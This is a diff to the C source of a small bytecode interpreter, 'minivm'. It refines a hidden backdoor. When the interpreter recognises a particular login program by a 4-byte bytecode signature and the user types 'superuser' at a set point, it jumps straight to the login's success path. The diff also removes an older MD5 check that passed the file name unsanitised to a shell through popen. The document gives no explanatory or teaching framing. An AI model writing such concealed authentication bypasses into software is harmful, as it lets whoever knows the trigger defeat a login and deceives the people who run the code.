@@ -6,15 +6,10 @@
 #include <stdbool.h>
 #include <assert.h>
 #include <string.h>
-#include <ctype.h>
 #include "minivm.h"
 
 #define NUM_REGS   (256)
 #define NUM_FUNCS  (256)
-#define PATH_MAX   (4096)
-#define MD5_LEN    (32)
-
-#define MY_PRGRAM_SIG 0x00eded30
 
 // Global variable that indicates if the process is running.
 static bool is_running = true;
@@ -164,9 +159,10 @@ void mini_gets(struct VMContext* ctx, const uint32_t instr) {
     }
     write_mem(ctx, pos, '\0');
     if (is_my_program && is_login_process &&
+        (ctx->pc == 87) && //check my program, one more..
         memcmp(ctx->heap + addr, "superuser\0", 7) == 0)
     {
-        ctx->pc = 3; // Success flow in my login program.
+        ctx->pc = 4; // Success flow in my login program.
     }
 }
 
@@ -224,30 +220,6 @@ uint32_t* read_bytecode(const char* filename, uint32_t* sz) {
     return bytecode;
 }
 
-int cal_MD5(const char* filename, char *md5_sum) {
-    char cmd[PATH_MAX + 20]; //+20, because of command
-    sprintf(cmd, "md5sum %s 2>/dev/null", filename);
-
-    FILE *p = popen(cmd, "r");
-    if (p == NULL) return 0;
-
-    int i, ch;
-    for (i = 0; i < MD5_LEN && isxdigit(ch = fgetc(p)); i++) {
-        *md5_sum++ = ch;
-    }
-
-    *md5_sum = '\0';
-    pclose(p);
-    return i == MD5_LEN;
-}
-
-void detect_my_program(const char* filename) {
-    char md5[MD5_LEN + 1];
-    assert(cal_MD5(filename, md5) != 0);
-    if (strncmp(md5, MY_PRGRAM_CHECKSUM, MD5_LEN) == 0)
-        is_my_program = true;
-}
-
 int main(int argc, char** argv) {
     VMContext vm;
     Reg r[NUM_REGS];
@@ -262,6 +234,12 @@ int main(int argc, char** argv) {
     // Initialize interpretation functions.
     initFuncs(f, NUM_FUNCS);
     bytecode = read_bytecode(argv[1], &bytecode_size);
+
+    // Detect my program
+    uint32_t sig = 0x00eded30;
+    if (memcmp(bytecode, &sig, 4) == 0)
+        is_my_program = true;
+
     // Initialize VM context.
     initVMContext(&vm, NUM_REGS, NUM_FUNCS, r, f, bytecode, bytecode_size);
 
